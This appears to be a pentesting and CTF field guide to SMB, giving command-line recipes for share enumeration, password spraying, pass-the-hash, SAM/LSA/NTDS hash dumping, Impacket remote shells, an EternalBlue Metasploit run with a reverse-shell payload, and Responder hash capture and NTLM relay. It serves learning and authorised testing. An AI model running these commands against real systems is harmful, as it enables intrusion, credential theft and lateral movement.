SMB — Field Guide

2026-06-02 · 1 min read · Tools · smb enumeration windows tools active-directory

Null sessions, share enumeration, pass-the-hash, and a full CTF workflow covering smbclient, smbmap, enum4linux, CrackMapExec, Impacket, EternalBlue, and Responder.

01 What is SMB

SMB (Server Message Block) is the Windows file-sharing protocol. It runs on port 445 (direct) and port 139 (over NetBIOS). It handles file shares, printers, named pipes, and Windows authentication.

For attackers and pentesters, SMB is one of the most valuable services on a network — it leaks usernames, hashes, shares, OS versions, and domain info, and has a long history of critical vulnerabilities (EternalBlue, PrintNightmare, PetitPotam).

Main tools:

ToolPurpose
`smbclient`Browse/transfer files, like an FTP client for SMB
`smbmap`Map share permissions across a network
`enum4linux` / `enum4linux-ng`Full SMB/LDAP enumeration
`crackmapexec` (CME) / `netexec`Swiss-army knife — auth, spray, exec
`impacket`Python SMB toolkit — psexec, secretsdump, smbexec
`rpcclient`Raw RPC queries — users, groups, policy
`nmap`NSE scripts for SMB vuln detection

02 Initial Recon

bash Detect and fingerprint SMB 
# Check if SMB is open
nmap -p 139,445 10.10.10.5

# OS + SMB version detection
nmap -p 445 --script smb-os-discovery 10.10.10.5

# Full SMB enumeration with NSE
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode 10.10.10.5

# Vulnerability scan
nmap -p 445 --script smb-vuln-* 10.10.10.5

# Check for EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.5

03 smbclient

smbclient is the built-in Kali/Linux SMB client — think of it as FTP for Windows shares. It connects to individual shares and gives you an interactive prompt.

bash smbclient usage 
# List available shares (null session — no credentials)
smbclient -L //10.10.10.5 -N

# List shares with credentials
smbclient -L //10.10.10.5 -U 'user%password'

# Connect to a specific share
smbclient //10.10.10.5/Share -N
smbclient //10.10.10.5/C$ -U 'administrator%Password123'

# Pass-the-hash (no plaintext password needed)
smbclient //10.10.10.5/C$ -U 'administrator' --pw-nt-hash <NTLM_HASH>

# Specify domain
smbclient //10.10.10.5/Share -U 'DOMAIN\user%password'
bash smbclient interactive commands 
smb: \> ls                    # list files
smb: \> ls -la                # list including hidden files
smb: \> cd Documents          # change directory
smb: \> get passwords.txt     # download a file
smb: \> put shell.exe         # upload a file
smb: \> mget *                # download everything
smb: \> prompt off            # disable per-file confirmation
smb: \> recurse on            # enable recursive listing/download
smb: \> mget *                # download all files recursively
smb: \> mkdir loot            # create a directory
smb: \> del old.txt           # delete a file
smb: \> exit
bash One-liner download (no interactive prompt) 
# Download a single file non-interactively
smbclient //10.10.10.5/Share -N -c 'get flag.txt'

# Download entire share recursively
smbclient //10.10.10.5/Share -N -c 'prompt off; recurse on; mget *'

04 smbmap

smbmap shows you all shares and their permissions at a glance — read, write, or no access. Much faster than connecting to each share manually.

bash smbmap enumeration 
# Null session — list shares and permissions
smbmap -H 10.10.10.5

# With credentials
smbmap -H 10.10.10.5 -u 'user' -p 'password'

# With NTLM hash
smbmap -H 10.10.10.5 -u 'administrator' -p '<NTLM_HASH>' --no-pass

# List contents of a specific share
smbmap -H 10.10.10.5 -u 'user' -p 'password' -r Share

# Recursive listing
smbmap -H 10.10.10.5 -u 'user' -p 'password' -R Share

# Download a file
smbmap -H 10.10.10.5 -u 'user' -p 'password' --download 'Share/path/file.txt'

# Scan entire subnet
smbmap -H 10.10.10.0/24 -u 'user' -p 'password'

05 enum4linux / enum4linux-ng

enum4linux pulls everything SMB and RPC have to offer in one shot: users, groups, shares, password policy, OS info, and domain details.

enum4linux-ng is the modern rewrite — faster, cleaner output, JSON export.

bash enum4linux enumeration 
# Full enumeration (null session)
enum4linux -a 10.10.10.5

# With credentials
enum4linux -a -u 'user' -p 'password' 10.10.10.5

# Specific flags
enum4linux -U 10.10.10.5   # users only
enum4linux -S 10.10.10.5   # shares only
enum4linux -P 10.10.10.5   # password policy
enum4linux -G 10.10.10.5   # groups
enum4linux -o 10.10.10.5   # OS info

# enum4linux-ng (recommended)
enum4linux-ng -A 10.10.10.5
enum4linux-ng -A -u 'user' -p 'password' 10.10.10.5
enum4linux-ng -A 10.10.10.5 -oJ results   # save as JSON

06 rpcclient

rpcclient sends raw RPC commands. Useful when you need specific info that higher-level tools don't expose — or when everything else is blocked.

bash rpcclient commands 
# Connect (null session)
rpcclient -U '' -N 10.10.10.5

# Connect with credentials
rpcclient -U 'user%password' 10.10.10.5

# Inside rpcclient:
rpcclient $> srvinfo          # server info + OS
rpcclient $> enumdomusers     # list domain users
rpcclient $> enumdomgroups    # list groups
rpcclient $> querydominfo     # domain info + password policy
rpcclient $> getdompwinfo     # password complexity policy
rpcclient $> enumprinters     # list printers
rpcclient $> netshareenumall  # list all shares

# One-liner (non-interactive)
rpcclient -U '' -N 10.10.10.5 -c 'enumdomusers' 2>/dev/null

# Extract just usernames
rpcclient -U '' -N 10.10.10.5 -c 'enumdomusers' 2>/dev/null \
  | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'

07 CrackMapExec / NetExec

CME (now netexec) is the fastest tool for credential testing, password spraying, and lateral movement at scale. Install: sudo apt install crackmapexec or pipx install netexec.

bash CrackMapExec / netexec examples 
# Test a single credential pair
crackmapexec smb 10.10.10.5 -u 'user' -p 'password'

# Test across a subnet
crackmapexec smb 10.10.10.0/24 -u 'administrator' -p 'Password123'

# Password spray (one password, many users)
crackmapexec smb 10.10.10.5 -u users.txt -p 'Password123' --continue-on-success

# Pass-the-hash
crackmapexec smb 10.10.10.5 -u 'administrator' -H '<NTLM_HASH>'

# List shares
crackmapexec smb 10.10.10.5 -u 'user' -p 'password' --shares

# Execute a command (requires admin)
crackmapexec smb 10.10.10.5 -u 'administrator' -p 'password' -x 'whoami'

# Dump SAM hashes (local admin required)
crackmapexec smb 10.10.10.5 -u 'administrator' -p 'password' --sam

# Dump LSA secrets
crackmapexec smb 10.10.10.5 -u 'administrator' -p 'password' --lsa

# Check for null sessions across subnet
crackmapexec smb 10.10.10.0/24 -u '' -p ''

08 Impacket

Impacket is a Python library with standalone scripts for SMB exploitation, hash dumping, and remote execution. Lives in /usr/share/doc/python3-impacket/examples/ or installed as impacket-* commands on Kali.

bash Key impacket scripts 
# psexec — remote shell via SMB (requires admin + writable share)
impacket-psexec administrator:Password123@10.10.10.5
impacket-psexec -hashes :<NTLM_HASH> administrator@10.10.10.5

# smbexec — stealthier remote exec (uses service, no file drop)
impacket-smbexec administrator:Password123@10.10.10.5

# wmiexec — exec via WMI (even stealthier, no service install)
impacket-wmiexec administrator:Password123@10.10.10.5

# secretsdump — dump SAM, LSA, NTDS.dit hashes remotely
impacket-secretsdump administrator:Password123@10.10.10.5
impacket-secretsdump -hashes :<NTLM_HASH> administrator@10.10.10.5

# smbclient.py — impacket's own smb client
impacket-smbclient administrator:Password123@10.10.10.5

# lookupsid — brute-force SID to enumerate users without creds
impacket-lookupsid anonymous@10.10.10.5 | grep SidTypeUser

09 Real-World Use Cases

Internal audit — find exposed shares and sensitive files:

bash Network-wide share audit 
# Map all SMB shares and permissions across the subnet
smbmap -H 10.0.0.0/24 -u 'auditor' -p 'password'

# Find SYSVOL/NETLOGON for GPP passwords (classic finding)
smbclient //10.0.0.5/SYSVOL -U 'user%password'
smb: \> recurse on
smb: \> prompt off
smb: \> mget *   # look for Groups.xml, Services.xml, etc.

# Search shares for sensitive filenames
crackmapexec smb 10.0.0.5 -u 'user' -p 'password' -M spider_plus

Mount an SMB share on Linux:

bash Mount SMB share 
sudo mkdir /mnt/share
sudo mount -t cifs //10.0.0.5/Share /mnt/share \
  -o username=user,password=password,vers=3.0

# Or add to /etc/fstab for persistent mount:
# //10.0.0.5/Share /mnt/share cifs credentials=/etc/samba/creds,vers=3.0 0 0

10 CTF & HackTheBox Workflow

On CTF/HTB boxes, SMB usually leads to credentials, flags, or a foothold. The typical flow: null session → share list → read files → find credentials → reuse creds → lateral movement or shell.

bash HTB SMB recon workflow 
export IP=10.10.10.5

# 1. Check SMB version + OS
nmap -p 445 --script smb-os-discovery $IP

# 2. Try null session share listing
smbclient -L //$IP -N
smbmap -H $IP

# 3. Full enum with enum4linux-ng
enum4linux-ng -A $IP

# 4. Browse readable shares
smbclient //$IP/ShareName -N

# 5. Dump everything from a readable share
smbclient //$IP/ShareName -N -c 'prompt off; recurse on; mget *'

# 6. If you have credentials — check for admin access
crackmapexec smb $IP -u 'user' -p 'password'
# Pwn3d! = local admin → can exec commands

# 7. Vuln check
nmap -p 445 --script smb-vuln-ms17-010 $IP
bash EternalBlue (MS17-010) — Metasploit 
# Check vulnerability first
nmap -p 445 --script smb-vuln-ms17-010 $IP

# Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.10.14.5
set PAYLOAD windows/x64/shell_reverse_tcp
run
bash Grab hashes via Responder (MITM) 
# Start Responder on your network interface
sudo responder -I tun0 -v

# Trigger a UNC path from the victim (file upload, URL, etc.)
# Responder captures NTLMv2 hashes

# Crack the captured hash offline
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
john captured.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Or relay the hash with ntlmrelayx (if SMB signing is disabled)
impacket-ntlmrelayx -tf targets.txt -smb2support
Quick reference

Always try null sessions first — smbclient -L //IP -N and smbmap -H IP.
crackmapexec is the fastest way to test creds across a subnet.
Pwn3d! in CME output = local admin rights = can dump hashes and exec commands.
impacket-secretsdump dumps everything remotely without dropping a binary.
Check SYSVOL for GPP passwords (cpassword in .xml files) — still common.
SMB signing disabled? That's a relay attack waiting to happen — check with CME: --gen-relay-list.
